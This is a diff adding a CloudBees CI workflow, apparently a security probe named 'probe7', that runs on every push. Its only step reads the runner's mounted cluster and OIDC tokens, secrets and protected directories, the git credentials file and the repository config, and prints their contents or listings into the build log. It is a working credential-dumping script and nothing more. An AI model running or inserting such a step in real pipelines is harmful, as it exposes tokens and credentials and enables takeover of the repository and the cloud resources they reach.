@@ -1,0 +1,27 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe7
+
+on:
+  push:
+    branches:
+      - "**"
+
+permissions:
+  scm-token-own: read
+  id-token: write
+
+jobs:
+  tokens:
+    steps:
+      - name: checkout
+        uses: cloudbees-io/checkout@v1
+      - name: dump-token-mounts
+        uses: docker://alpine:3.20
+        run: |
+          echo "== cluster-token"; ls -la /cloudbees/cluster-token; for f in /cloudbees/cluster-token/*; do echo "-- $f"; head -c 120 "$f" 2>&1; echo; done
+          echo "== idtoken"; ls -la /cloudbees/idtoken; for f in /cloudbees/idtoken/*; do echo "-- $f"; head -c 120 "$f" 2>&1; echo; done
+          echo "== secrets"; ls -laR /cloudbees/secrets 2>&1 | head -20
+          echo "== protected"; ls -laR /cloudbees/protected 2>&1 | head -20
+          echo "== gitcreds"; cat /cloudbees/home/.git-credentials 2>&1 | head -3; cat /cloudbees/workspace/.git/config 2>&1 | head -20
+          echo "== event.json head"; head -c 600 /cloudbees/event.json
